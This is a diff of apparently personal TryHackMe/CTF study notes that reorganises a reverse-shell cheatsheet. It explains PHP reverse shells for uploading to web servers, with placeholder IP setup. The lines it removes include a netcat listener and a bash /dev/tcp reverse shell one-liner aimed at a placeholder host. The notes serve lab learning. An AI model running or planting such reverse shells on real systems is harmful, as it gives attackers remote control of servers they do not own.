@@ -518,44 +518,28 @@ TRYHACKME{YOU_FOUND_THE_KEY}
 
 </details>
 
-<details>
-<summary>🐚 PHP Reverse Shell</summary>
-
-## 📌 When we use it
-
-Use a PHP reverse shell when:
-
-- Target website runs PHP
-- You can upload a `.php` file
-- Uploaded file can be opened from the browser
-- You want shell access from the web server
+# 🔁 Reverse Shell Cheatsheet
 
 ---
 
-## ⚙️ Setup
+<details>
+<summary>🐚 PHP Reverse Shell</summary>
 
-Edit the reverse shell file:
+### 📌 What is it?
+A PHP reverse shell lets the target web server connect back to your machine and gives you a shell.
+
+---
+
+### 📌 When to use it
+- Target runs PHP
+- You can upload `.php` files
+- File is accessible via browser
+
+---
+
+### ⚙️ Setup
+Edit the shell file:
 
 ```php
 $ip = 'YOUR_KALI_IP';
 $port = 4444;
-
-
----
-</details>
-<details>
-<summary>Bash Reverse Shell</summary>
-
-### What is it?
-A reverse shell makes the target connect back to your machine so you get control.
-
----
-
-### Step 1: Start listener (your machine)
-```bash
-nc -lvnp 4444
-
-### Step 2: Run on target
-```bash 
-bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
-
